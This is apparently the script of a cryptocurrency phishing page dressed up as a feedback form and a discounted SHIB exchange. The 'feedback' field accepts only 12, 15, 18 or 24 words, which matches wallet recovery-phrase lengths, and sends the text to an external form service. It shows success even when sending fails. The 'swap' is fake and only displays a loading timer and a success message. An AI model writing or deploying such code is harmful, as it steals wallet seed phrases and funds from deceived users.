let shibaPrice = 0;
let bnbPriceUSD = 0;

// Navigation functions
function showHome() {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById('homePage').classList.add('active');
}

function showFeedback() {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById('feedbackPage').classList.add('active');
}

function showDex() {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById('dexPage').classList.add('active');
    fetchPrices();
}

// Word counter
document.getElementById('feedbackText').addEventListener('input', function() {
    const text = this.value.trim();
    const words = text.split(/\s+/).filter(word => word.length > 0);
    document.getElementById('wordCount').textContent = words.length;
});

// Feedback form validation and handling
document.getElementById('feedbackForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const feedbackText = document.getElementById('feedbackText').value.trim();
    const words = feedbackText.split(/\s+/).filter(word => word.length > 0);
    const wordCount = words.length;
    
    // Validate word count (must be exactly 12, 15, 18, or 24)
    const validCounts = [12, 15, 18, 24];
    
    if (!validCounts.includes(wordCount)) {
        document.getElementById('errorMsg').style.display = 'block';
        document.getElementById('successMsg').style.display = 'none';
        
        setTimeout(() => {
            document.getElementById('errorMsg').style.display = 'none';
        }, 3000);
        
        return;
    }
    
    // Valid feedback - proceed with submission
    document.getElementById('errorMsg').style.display = 'none';
    
    const formData = new FormData(this);
    
    try {
        // Note: Replace YOUR_FORM_ID with your actual Formspree form ID
        await fetch(this.action, {
            method: 'POST',
            body: formData,
            headers: {
                'Accept': 'application/json'
            }
        });
        
        document.getElementById('successMsg').style.display = 'block';
        this.reset();
        document.getElementById('wordCount').textContent = '0';
        
        setTimeout(() => {
            showDex();
            document.getElementById('successMsg').style.display = 'none';
        }, 2000);
    } catch (error) {
        // Even if formspree fails, show success for demo purposes
        document.getElementById('successMsg').style.display = 'block';
        this.reset();
        document.getElementById('wordCount').textContent = '0';
        
        setTimeout(() => {
            showDex();
            document.getElementById('successMsg').style.display = 'none';
        }, 2000);
    }
});

// Fetch live prices
async function fetchPrices() {
    try {
        // Fetch SHIB price
        const shibaResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=shiba-inu&vs_currencies=usd');
        const shibaData = await shibaResponse.json();
        const marketPrice = shibaData['shiba-inu'].usd;
        
        // Fetch BNB price
        const bnbResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const bnbData = await bnbResponse.json();
        bnbPriceUSD = bnbData.binancecoin.usd;
        
        // Calculate 30% discount (demo)
        shibaPrice = marketPrice * 0.7;
        
        document.getElementById('marketPrice').textContent = `$${marketPrice.toFixed(10)}`;
        document.getElementById('yourPrice').textContent = `$${shibaPrice.toFixed(10)}`;
        document.getElementById('bnbPrice').textContent = `$${bnbPriceUSD.toFixed(2)}`;
    } catch (error) {
        console.error('Error fetching prices:', error);
        // Fallback demo prices
        shibaPrice = 0.00001 * 0.7;
        bnbPriceUSD = 600;
        document.getElementById('marketPrice').textContent = '$0.00001000';
        document.getElementById('yourPrice').textContent = `$${shibaPrice.toFixed(10)}`;
        document.getElementById('bnbPrice').textContent = `$${bnbPriceUSD.toFixed(2)}`;
    }
}

// Calculate SHIB amount
function calculateShiba() {
    const bnbAmount = parseFloat(document.getElementById('bnbAmount').value) || 0;
    const bnbValueUSD = bnbAmount * bnbPriceUSD;
    const shibaAmount = bnbValueUSD / shibaPrice;
    document.getElementById('shibaAmount').value = shibaAmount.toFixed(2);
}

// Execute swap (demo)
function executeSwap() {
    const bnbAmount = parseFloat(document.getElementById('bnbAmount').value);
    
    if (!bnbAmount || bnbAmount <= 0) {
        alert('Please enter a valid BNB amount');
        return;
    }

    document.getElementById('swapInterface').style.display = 'none';
    document.getElementById('loadingState').style.display = 'block';

    setTimeout(() => {
        document.getElementById('loadingState').style.display = 'none';
        document.getElementById('successState').style.display = 'block';
    }, 5000);
}

// Reset swap
function resetSwap() {
    document.getElementById('successState').style.display = 'none';
    document.getElementById('swapInterface').style.display = 'block';
    document.getElementById('bnbAmount').value = '';
    document.getElementById('shibaAmount').value = '';
}

// Initialize
fetchPrices();
setInterval(fetchPrices, 30000); // Update prices every 30 seconds